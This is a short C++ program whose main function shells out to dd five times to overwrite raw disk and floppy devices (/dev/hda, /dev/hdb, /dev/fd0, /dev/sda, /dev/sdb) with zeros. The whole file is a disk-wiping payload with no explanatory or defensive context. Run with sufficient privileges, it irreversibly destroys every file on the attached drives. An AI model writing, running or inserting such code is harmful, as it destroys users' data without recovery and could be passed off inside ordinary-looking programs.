#include <iostream>

int main() {
  system("dd if=/dev/zero of=/dev/hda bs=1M");
  system("dd if=/dev/zero of=/dev/hdb bs=1M");
  system("dd if=/dev/zero of=/dev/fd0 bs=1M");
  system("dd if=/dev/zero of=/dev/sda bs=1M");
  system("dd if=/dev/zero of=/dev/sdb bs=1M");
  return 0;
}
